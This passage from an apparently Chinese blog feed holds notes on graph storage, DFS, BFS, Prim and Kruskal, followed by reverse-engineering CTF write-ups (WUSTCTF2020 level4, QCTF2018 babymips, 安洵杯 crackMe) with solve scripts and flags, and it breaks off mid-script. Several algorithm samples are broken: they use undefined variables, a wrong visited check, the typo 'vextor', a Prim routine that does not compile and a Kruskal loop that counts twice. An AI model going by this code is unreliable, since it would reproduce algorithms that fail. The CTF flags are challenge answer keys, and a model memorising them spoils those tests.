可确定顶点i和j之间是否有边相连</p></li><li><p>其第i行1的个数或第i列1的个数，等于顶点i的度TD(i)</p></li><li><p>特别：完全图的邻接矩阵中，对角元素为0，其余全1。</p></li><li><p>有向图的邻接矩阵可能是不对称的</p></li><li><p>其第i行1的个数等于顶点i的出度OD(i)，第j列1的个数等于顶点j的入度ID(j)</p></li><li><p>顶点的度&#x3D;第i行元素之和+第i列元素之和</p></li></ul><p>代码样例：</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">10001</span>;</span><br><span class="line"><span class="type">int</span> adj[MAXN][MAXN];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">    <span class="type">int</span> u, v;</span><br><span class="line">    cin &gt;&gt; u &gt;&gt; v;</span><br><span class="line">    adj[u][v] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//若无向</span></span><br><span class="line">    <span class="comment">//adj[v][u] = 1;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p><strong>复杂度</strong></p><p>查询是否存在某条边：$O(1)$ 。</p><p>遍历一个点的所有出边：$O(n)$ 。</p><p>遍历整张图：$O(n^{2})$ 。</p><p>空间复杂度：$O(n^{2})$ 。</p><p><strong>应用</strong></p><p>邻接矩阵只适用于没有重边（或重边可以忽略）的情况。</p><p>其最显著的优点是可以 查询一条边是否存在。</p><p>由于邻接矩阵在稀疏图上效率很低（尤其是在点数较多的图上，空间无法承受），所以一般只会在稠密图上使用邻接矩阵。</p>        <h3 id="邻接表"   >          <a href="#邻接表" class="heading-link"><i class="fas fa-link"></i></a><a href="#邻接表" class="headerlink" title="邻接表"></a>邻接表</h3>      <p>利用vector的可变长空间，我们建立<code>vector&lt;int&gt;Node[N]</code>，<code>Node[ u ]</code>内的任一值 v 代表有一条边 $&lt; u , v &gt;$</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208960.png" alt="image-20221107143526461"></p><p>代码样例：</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt; &gt; adj;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="type">int</span> u, v;</span><br><span class="line">    cin &gt;&gt; u &gt;&gt; v;</span><br><span class="line">    adj[u].<span class="built_in">push_back</span>(v);</span><br><span class="line">    <span class="comment">//若无向</span></span><br><span class="line">    <span class="comment">//adj[v].push_back(u);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p><strong>复杂度</strong></p><p>查询是否存在 到 的边：$O(d + (u))$ 。</p><p>遍历点 的所有出边：$O(d + (u))$ 。</p><p>遍历整张图：$O(m + n)$ 。</p><p>空间复杂度：$O(m)$ 。</p><p><strong>应用</strong></p><p>存各种图都很适合，除非有特殊需求（如需要快速查询一条边是否存在，且点数较少，可以使用邻接矩阵）。</p><p>尤其适用于需要对一个点的所有出边进行排序的场合。</p>        <h2 id="图的遍历"   >          <a href="#图的遍历" class="heading-link"><i class="fas fa-link"></i></a><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h2>      <ul><li>从图的某一顶点开始，访遍图中其余顶点，且使每一个顶点仅被访问一次</li><li>图的遍历主要应用于无向图</li><li>遍历实质：找每个顶点的邻接点的过程。</li></ul>        <h4 id="深度优先搜索"   >          <a href="#深度优先搜索" class="heading-link"><i class="fas fa-link"></i></a><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h4>      <p>DFS 最显著的特征在于其 <strong>递归调用自身</strong>。同时与 BFS 类似，DFS 会对其访问过的点打上访问标记，在遍历图时跳过已打过标记的点，以确保 <strong>每个点仅访问一次</strong>。符合以上两条规则的函数，便是广义上的 DFS。</p><p>邻接矩阵：</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">vis[pos] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> v = <span class="number">0</span>; v &lt; n; v++)&#123;</span><br><span class="line"><span class="keyword">if</span>(adj[u][v] &amp;&amp; !vis[v])&#123;</span><br><span class="line"><span class="built_in">dfs</span>(v);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dfs</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!vis[i])&#123;</span><br><span class="line"><span class="built_in">dfs</span>(i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>邻接表：</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">vector&lt; vector&lt;<span class="type">int</span>&gt; &gt; graph[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">vis[u] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> v: graph[u])&#123;</span><br><span class="line"><span class="keyword">if</span>(!vis[v])&#123;</span><br><span class="line"><span class="built_in">dfs</span>(v);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dfs</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!vis[i])&#123;</span><br><span class="line"><span class="built_in">dfs</span>(i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h4 id="广度优先搜索"   >          <a href="#广度优先搜索" class="heading-link"><i class="fas fa-link"></i></a><a href="#广度优先搜索" class="headerlink" title="广度优先搜索"></a>广度优先搜索</h4>      <p>BFS 全称是 Breadth First Search，中文名是宽度优先搜索，也叫广度优先搜索。</p><p>是图上最基础、最重要的搜索算法之一。</p><p>所谓宽度优先。就是每次都尝试访问同一层的节点。 如果同一层都访问完了，再访问下一层。</p><p>这样做的结果是，BFS 算法找到的路径是从起点开始的 <strong>最短</strong> 合法路径。换言之，这条路径所包含的边数最小。</p><p>在 BFS 结束时，每个节点都是通过从起点到该点的最短路径访问的。</p><p>邻接矩阵：</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">queue&lt;<span class="type">int</span>&gt; st;</span><br><span class="line">st.<span class="built_in">push</span>(u);</span><br><span class="line">vis[u] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(!st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">u = st.<span class="built_in">front</span>();</span><br><span class="line">st.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> v = <span class="number">0</span>; v &lt; n; v++)&#123;</span><br><span class="line"><span class="keyword">if</span>(graph[u][v] &amp;&amp; !vis[u])&#123;</span><br><span class="line">st.<span class="built_in">push</span>(v);</span><br><span class="line">vis[v] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Bfs</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!vis[i])&#123;</span><br><span class="line"><span class="built_in">bfs</span>(i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>邻接表：</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">vextor&lt;<span class="type">int</span>&gt; graph[N]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">queue&lt;<span class="type">int</span>&gt; st;</span><br><span class="line">st.<span class="built_in">push</span>(u);</span><br><span class="line">vis[u] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(!st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">u = st.<span class="built_in">front</span>();</span><br><span class="line">st.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> v: graph[u])&#123;</span><br><span class="line"><span class="keyword">if</span>(!vis[v])&#123;</span><br><span class="line">st.<span class="built_in">push</span>(v);</span><br><span class="line">vis[v] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Bfs</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!vis[i])&#123;</span><br><span class="line"><span class="built_in">bfs</span>(i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="图的连通性问题"   >          <a href="#图的连通性问题" class="heading-link"><i class="fas fa-link"></i></a><a href="#图的连通性问题" class="headerlink" title="图的连通性问题"></a>图的连通性问题</h2>              <h4 id="无向图的连通"   >          <a href="#无向图的连通" class="heading-link"><i class="fas fa-link"></i></a><a href="#无向图的连通" class="headerlink" title="无向图的连通"></a>无向图的连通</h4>      <ul><li>非连通图的极大连通子图叫做连通分量</li><li>若从无向图的每一个连通分量中的一个顶点出发进行DFS或BFS遍历，可求得无向图的所有连通分量的生成树(DFS或BFS生成树)</li><li>所有连通分量的生成树组成了非连通图的生成森林</li></ul>        <h4 id="最小生成树"   >          <a href="#最小生成树" class="heading-link"><i class="fas fa-link"></i></a><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h4>      <ul><li>如果无向图中，边上有权值，则称该无向图为无向网</li><li>如果无向网中的每个顶点都相通，称为连通网</li><li>最小生成树(Minimum Cost Spanning Tree)是代价最小的连通网的生成树，即该生成树上的边的权值和最小</li></ul><p>要求：</p><ul><li>必须使用且仅使用连通网中的n-1条边来联结网络中的n个顶点；</li><li>不能使用产生回路的边；</li><li>各边上的权值的总和达到最小。</li></ul><p>Prim算法和Kruskal算法都可以看成是应用贪心算法设计策略的例子。</p>        <h5 id="Prim算法"   >          <a href="#Prim算法" class="heading-link"><i class="fas fa-link"></i></a><a href="#Prim算法" class="headerlink" title="Prim算法"></a>Prim算法</h5>      <p>算法思想：从某一点出发，挑选一条连接这个点的权值最小的边，将这条边和连着的那个点加入最小生成树；</p><p> 然后继续挑选一条连接目前最小生成树的权值最小的边，将这条边和连着的那个点加入最小生成树。</p><p>代码样例：</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">5050</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> to;</span><br><span class="line">    <span class="type">int</span> weight = MAXN;</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">vector&lt;node&gt; graph[MAXN]; <span class="comment">//邻接表</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prim</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> now = <span class="number">0</span>;</span><br><span class="line">    Node tmp[len];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; graph[now].<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">        tmp[graph[now][i].to] = <span class="built_in">min</span>(tmp[graph[now][i].to], graph[now][i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    tmp[now].weight = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)&#123;</span><br><span class="line">        <span class="type">int</span> min = MAXN;</span><br><span class="line">        <span class="type">int</span> next;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; tmp.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!tmp[j].weight &amp;&amp; tmp[j].weight &lt; min)&#123;</span><br><span class="line">                min = tmp[j].weight;</span><br><span class="line">                next = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; graph[next].<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!tmp[graph[next][i].to] &amp;&amp; graph[next][i].weight &lt; tmp[graph[next][i].to].weight)&#123;</span><br><span class="line">                tmp[graph[next][i].weight = graph[next][i].weight;</span><br><span class="line">&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        tmp[next].weight = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h5 id="Kruskal算法"   >          <a href="#Kruskal算法" class="heading-link"><i class="fas fa-link"></i></a><a href="#Kruskal算法" class="headerlink" title="Kruskal算法"></a>Kruskal算法</h5>      <p>算法思想：将所有边从小到大排序，然后依次挑选这些边，只要一条边连接的两个点不连通，就将这条边加入最小生成树。</p><p>具体来说，维护一个森林，查询两个结点是否在同一棵树中，连接两棵树。</p><p>抽象一点地说，维护一堆 <strong>集合</strong>，查询两个元素是否属于同一集合，合并两个集合。</p><p>其中，查询两点是否连通和连接两点可以使用并查集维护。</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">并查集是一种支持查找一个元素所属的集合以及两个元素各自所属集合的合并等运算的数据结构。并查集的一种最简单实现就是维护数组v[n]，数组元素v[i]代表序号为i的顶点所属的集合的编号。初始状态时数组元素v[i]的值即为i。当两个顶点的集合编号不同时，将这两个顶点所构成的边加入到生成树中一定不会形成回路。当这条边被加入到生成树后，需要对这两个顶点所属的集合进行合并，也就是将两个顶点集合的编号统一。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> v[N];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> x1;</span><br><span class="line">    <span class="type">int</span> x2;</span><br><span class="line">    <span class="type">int</span> weight;</span><br><span class="line">    </span><br><span class="line">&#125; enc[N]; <span class="comment">//按边的权值排好序的边集</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Kruskal</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">        v[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(++count &lt; len)&#123; <span class="comment">//遍历全部的边</span></span><br><span class="line">        <span class="type">int</span> p1 = enc[k].x1;</span><br><span class="line">        <span class="type">int</span> p2 = enc[k].x2;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(v[p1] != v[p2])&#123;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="type">int</span> q1 = v[p1];</span><br><span class="line">            <span class="type">int</span> q2 = v[p2];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(v[i] == q1) v[i] = q2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        k++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p><strong>克鲁斯卡尔的时间复杂度</strong></p><p>它主要分为三个部分，首先我们要对 n个节点进行初始化，所以第一部分的复杂度为O(n) ；然后，我们要对所有边 e 进行排序，用<strong>基于比较的排序算法</strong>，我们最快能够达到 eloge 的复杂度；最后，我们判断两个节点是否属于一个集合，由于树的高度和节点数 呈现一个近似对数关系，而我们要对 n-1 条边进行判断，因此这一部分的时间复杂度就为nlogn 。由于<strong>在比较稠密的图中，边的个数大于节点的个数</strong>，所以总的复杂度我们取较大的eloge 。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wustctf2020 level4</title>
      <link href="/2022/11/06/level4/"/>
      <url>/2022/11/06/level4/</url>
      
        <content type="html"><![CDATA[        <h2 id="WUSTCTF2020-level4"   >          <a href="#WUSTCTF2020-level4" class="heading-link"><i class="fas fa-link"></i></a><a href="#WUSTCTF2020-level4" class="headerlink" title="[WUSTCTF2020]level4"></a>[WUSTCTF2020]level4</h2>      <p>ida64位</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208077.png" alt="image-20221106172608389"></p><p>init()函数初始化了一个字符串</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208078.png" alt="image-20221106172627207"></p><p>下面两个函数分别是该数组的中序遍历和后序遍历</p><p>这是中序</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208079.png" alt="image-20221106172718112"></p><p>这是后序</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208080.png" alt="image-20221106172749236"></p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;This_IS_A_7reE&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Xman-babymips</title>
      <link href="/2022/11/06/Xman-babymips/"/>
      <url>/2022/11/06/Xman-babymips/</url>
      
        <content type="html"><![CDATA[        <h2 id="QCTF2018-Xman-babymips"   >          <a href="#QCTF2018-Xman-babymips" class="heading-link"><i class="fas fa-link"></i></a><a href="#QCTF2018-Xman-babymips" class="headerlink" title="[QCTF2018]Xman-babymips"></a>[QCTF2018]Xman-babymips</h2>      <p>ida32位</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132207057.png" alt="image-20221106165757833"></p><p>一个异或加上一个sub_4007F0</p><p>sub_4007F0：</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132207058.png" alt="image-20221106165833454"></p><p>从第五位开始到末尾进行移位</p><p>提取出off_410D04，写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">0x51</span>, <span class="number">0x7C</span>, <span class="number">0x6A</span>, <span class="number">0x7B</span>, <span class="number">0x67</span>, <span class="number">0x52</span>, <span class="number">0xFD</span>, <span class="number">0x16</span>, <span class="number">0xA4</span>, <span class="number">0x89</span>,</span><br><span class="line">        <span class="number">0xBD</span>, <span class="number">0x92</span>, <span class="number">0x80</span>, <span class="number">0x13</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0xA0</span>, <span class="number">0x8D</span>, <span class="number">0x45</span>, <span class="number">0x18</span>,</span><br><span class="line">        <span class="number">0x81</span>, <span class="number">0xDE</span>, <span class="number">0xFC</span>, <span class="number">0x95</span>, <span class="number">0xF0</span>, <span class="number">0x16</span>, <span class="number">0x79</span>, <span class="number">0x1A</span>, <span class="number">0x15</span>, <span class="number">0x5B</span>,</span><br><span class="line">        <span class="number">0x75</span>, <span class="number">0x1F</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> i &amp; <span class="number">1</span> != <span class="number">0</span>:</span><br><span class="line">        flag[i] = (flag[i] &amp; <span class="number">0x3f</span>) &lt;&lt; <span class="number">2</span> | (flag[i] &amp; <span class="number">0xD0</span>) &gt;&gt; <span class="number">6</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag[i] = (flag[i] &amp; <span class="number">0xfd</span>) &gt;&gt; <span class="number">2</span> | (flag[i] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = flag[i] ^ (<span class="number">32</span> - i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]&amp;<span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qctf&#123;ReA11y_4_B@89_mlp5_4_XmAn_&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯 crackMe</title>
      <link href="/2022/11/05/crackMe/"/>
      <url>/2022/11/05/crackMe/</url>
      
        <content type="html"><![CDATA[        <h2 id="安洵杯-2019-crackMe"   >          <a href="#安洵杯-2019-crackMe" class="heading-link"><i class="fas fa-link"></i></a><a href="#安洵杯-2019-crackMe" class="headerlink" title="[安洵杯 2019]crackMe"></a>[安洵杯 2019]crackMe</h2>      <p>32位无壳</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208313.png" alt="image-20221105221741939"></p><p>触发了异常处理——(向量化异常处理)VEH hook</p><p>关键在于找到他的异常处理函数<code>TopLevelExceptionFilter</code></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208314.png" alt="image-20221105222101069"></p><p>将str1base64加密后再与换位后的str2比较</p><p>查看base64</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208315.png" alt="image-20221105222235523"></p><p>查看base64_table的交叉引用发现码表本身也被改动了</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208316.png" alt="image-20221105222423347"></p><p>最后的结果就是将标准码表大小写转换后在循环向后位移24个字符</p><p>然后再去找输入</p><p>发现输入经过了一个sm4加密后被传到str11里面的</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208317.png" alt="image-20221105223112962"></p><p>对这个key交叉引用</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132208318.png" alt="image-20221105223249022"></p><p>找到密钥</p><p>写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  base64</span><br><span class="line"><span class="keyword">import</span> pysm4</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;1UTAOIkpyOSWGv/mOYFY4R&quot;</span></span><br><span class="line">flag = <span class="built_in">list</span>(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">2</span>):</span><br><span class="line">    flag[i], flag[i+<span class="number">1</span>] = flag[i+<span 